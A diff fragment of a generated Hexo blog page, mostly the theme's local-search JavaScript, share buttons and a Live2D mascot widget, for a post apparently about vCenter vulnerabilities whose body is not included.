+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F04%2F18%2FvCenter2021%25E5%2587%25A0%25E4%25B8%25AA%25E6%25BC%258F%25E6%25B4%259E%25E5%258F%258A%25E5%2590%258E%25E6%25B8%2597%25E9%2580%258F%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
